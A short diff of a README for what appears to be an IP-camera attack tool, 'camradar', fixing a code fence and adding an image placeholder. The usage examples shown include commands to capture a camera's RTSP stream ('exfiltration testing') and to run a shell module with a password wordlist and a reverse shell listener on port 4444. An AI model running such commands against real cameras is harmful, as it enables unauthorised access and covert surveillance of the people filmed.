@@ -123,7 +123,13 @@ Before execution, grant binary execution permissions: `chmod +x camradar`
 4. Live Stream Exfiltration Testing (RTSP Capture for 60 Seconds)
 
 ./camradar -i 203.0.113.50 -m stream -t 60
-```
+
 5. Multi-Module Audit with Custom Wordlist & Reverse Shell Handler
 
 ./camradar -i 192.168.1.150 -p 8080 -m shell --lport 4444 --creds custom_pass.txt
+```
+# IMG
+<p align="center">
+  <img src="đường-dẫn-đến-file-ảnh.png" alt="image" width="500">
+</p>
+
